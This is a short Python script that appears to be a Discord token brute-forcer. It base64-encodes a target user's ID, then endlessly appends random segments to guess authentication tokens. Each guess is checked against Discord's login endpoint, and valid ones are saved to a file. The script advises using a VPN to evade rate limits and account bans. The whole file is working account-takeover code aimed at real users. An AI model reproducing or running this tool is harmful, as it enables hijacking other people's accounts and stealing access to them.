import base64
import os
import random
import string
import requests
from colorama import *
import time
print("welcome user")
time.sleep(2)
print("installing dependencies")
time.sleep(2)
print("done")
time.sleep(2)
print("WARNING USING THIS TOOL WITHOUT AN VPN CAN GET YOU RATE LIMITED/ACCOUNT TERMINATION PLEASE USE VPN BEFORE USING THIS TOOL!")
time.sleep(5)

id_to_token = base64.b64encode((input("ID TO TOKEN --> ")).encode("ascii"))
id_to_token = str(id_to_token)[2:-1]

while id_to_token == id_to_token:
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
    }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] VALID' + ' ' + token)
            f = open('hit.txt', "a+")
            f.write(f'{token}\n')
        else:
            print(Fore.RED + '[-] INVALID' + ' ' + token)
    finally:
        print("")


input()
